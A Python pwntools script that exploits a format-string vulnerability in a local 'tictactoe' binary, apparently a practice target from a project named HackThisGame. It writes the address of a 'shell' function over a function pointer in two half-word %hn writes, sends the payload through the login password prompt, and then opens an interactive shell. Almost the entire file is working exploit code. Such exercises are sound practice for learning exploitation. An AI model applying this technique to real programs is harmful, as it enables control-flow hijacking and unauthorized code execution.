from pwn import *

elf = ELF('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe')

DEBUG = False

script = '''
b loginPlayer
'''

if DEBUG:
	conn = gdb.debug('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe', gdbscript = script)
else:
	conn = process('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe')


#important values:

first_param_idx = 8
second_param_idx = 9

shell_adr = elf.sym.shell
first_half_word_shell = shell_adr & 0xffff # get the lower two bytes of the adr of shell
second_half_word_shell = (shell_adr >> 16) & 0xffff # get the higher two bytes of the adr of shell

ptr_adr = elf.sym.myFunctionPointer
first_write_loc = 0x804cea4
second_write_loc = 0x804cea6


# payload

# the adr of ptr separated to 2 half words
# the first two chars 'AA' are to align the bytes \xa4\xce\x04\x08\xa6\xce\x04\x08 
# to be exactly on the correct adr on the stack
# so printf could reference them as function parameters.
payload = "AA\xa4\xce\x04\x08\xa6\xce\x04\x08"  
p_adr_section_size = len(payload)


# because of how %n works we want to right the lower half word of the adr (lower in its value) first

# in case the lower half word (in memory) is the lower (in value)
if first_half_word_shell > second_half_word_shell:
    payload += f"%0{second_half_word_shell - p_adr_section_size}x%{second_param_idx}$hn"
    payload += f"%0{first_half_word_shell - second_half_word_shell}x%{first_param_idx}$hn"

# in case the higher half word (in memory) is the lower (in value)
else:
    payload += f"%0{first_half_word_shell - p_adr_section_size}x%{first_param_idx}$hn"
    payload += f"%0{second_half_word_shell - first_half_word_shell}x%{second_param_idx}$hn"


#interact with program:
#choose to login
print(conn.recvuntil("type s:").decode())
conn.sendline("l")
# name: 
print(conn.recvuntil("10 chars!!):").decode())
conn.sendline("aaa")
#password: send payload
print(conn.recvuntil("100 chars!!):").decode())
print(f"payload: {payload}")
conn.sendline(payload)
print("sent payload")
print("now we jump to shell!")
conn.interactive()


